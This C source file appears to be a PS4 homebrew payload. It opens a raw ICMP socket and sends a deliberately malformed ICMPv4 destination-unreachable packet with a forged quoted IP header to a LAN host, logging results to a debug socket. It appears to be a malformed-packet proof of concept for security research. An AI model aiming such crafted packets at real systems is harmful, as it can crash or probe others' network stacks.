#include "ps4.h"

#define SOCK_RAW        3

#define debug(sock, format, ...)                    \
    do {                                            \
        char buffer[512];                           \
        int size = sprintf(buffer, format, ##__VA_ARGS__); \
        sceNetSend(sock, buffer, size, 0);          \
    } while(0)

int _main(void) {

    initKernel();
    initLibc();
    initNetwork();

    char socketName[] = "debug";

    struct sockaddr_in server;
    server.sin_len = sizeof(server);
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = IP(192, 168, 248, 159);
    server.sin_port = sceNetHtons(9023);
    memset(server.sin_zero, 0, sizeof(server.sin_zero));

    int debug_sock = sceNetSocket(socketName, AF_INET, SOCK_STREAM, 0);
    if (debug_sock < 0) {
        return 0;
    }

    if (sceNetConnect(debug_sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        sceNetSocketClose(debug_sock);
        return 0;
    }

    debug(debug_sock, "PID: %d\n", syscall(20));

    int raw_sock = sceNetSocket("raw_icmp", AF_INET, SOCK_RAW, SCE_NET_IPPROTO_ICMP);

    if (raw_sock < 0) {
        debug(debug_sock, "Raw ICMP socket failed: %d (errno: %d)\n", raw_sock, sce_net_errno);
        goto cleanup;
    }

    debug(debug_sock, "Raw ICMP socket created: %d\n", raw_sock);

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_len = sizeof(dest);
    dest.sin_family = AF_INET;
    dest.sin_port = 0;
    dest.sin_addr.s_addr = IP(192, 168, 248, 159);

    uint8_t icmp_packet[96];
    memset(icmp_packet, 0, sizeof(icmp_packet));

    icmp_packet[0] = 3;
    icmp_packet[1] = 99;

    uint8_t *quoted = icmp_packet + 8;
    quoted[0] = 0x45;
    quoted[1] = 0x00;
    quoted[2] = 0x00; quoted[3] = 0x28;
    quoted[4] = 0x00; quoted[5] = 0x00;
    quoted[6] = 0x40; quoted[7] = 0x00;
    quoted[8] = 64;
    quoted[9] = 6;

    quoted[12] = 192; quoted[13] = 168; quoted[14] = 0; quoted[15] = 100;
    quoted[16] = 192; quoted[17] = 168; quoted[18] = 0; quoted[19] = 1;

    memset(quoted + 20, 0xAA, 32);

    int packet_len = 8 + 20 + 32;

    sceNetConnect(raw_sock, (struct sockaddr *)&dest, sizeof(dest));

    int sent = sceNetSend(raw_sock, icmp_packet, packet_len, 0);

    if (sent < 0) {
        debug(debug_sock, "sceNetSend failed: %d (errno: %d)\n", sent, sce_net_errno);
    } else {
        debug(debug_sock, "Sent malformed ICMPv4: %d bytes\n", sent);
    }

    sceNetSocketClose(raw_sock);

cleanup:
    sceNetSocketClose(debug_sock);

    return 0;
}